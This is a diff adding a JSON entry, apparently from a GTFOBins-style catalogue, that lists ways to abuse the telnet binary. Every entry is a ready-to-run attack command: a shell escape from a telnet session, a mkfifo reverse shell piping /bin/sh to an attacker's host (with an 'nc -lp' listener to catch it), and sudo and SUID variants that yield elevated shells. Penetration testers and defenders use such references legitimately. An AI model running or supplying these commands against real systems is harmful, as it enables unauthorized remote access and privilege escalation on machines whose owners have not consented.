@@ -1,0 +1,28 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "BSD version only. Needs to be connected first.",
+        "code": "telnet [host] [port]\n^]\n!/bin/sh\n"
+      }
+    ],
+    "reverse-shell": [
+      {
+        "description": "Run 'nc -lp [port]' on the attacker box to receive the shell.",
+        "code": "TF=$(mktemp -u)\nmkfifo $TF && telnet [host] [port] 0<$TF | /bin/sh 1>$TF\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "BSD version only. Needs to be connected first.",
+        "code": "sudo telnet [host] [port]\n^]\n!/bin/sh\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "description": "BSD version only. Needs to be connected first.",
+        "code": "./telnet [host] [port]\n^]\n!/bin/sh\n"
+      }
+    ]
+  }
+}
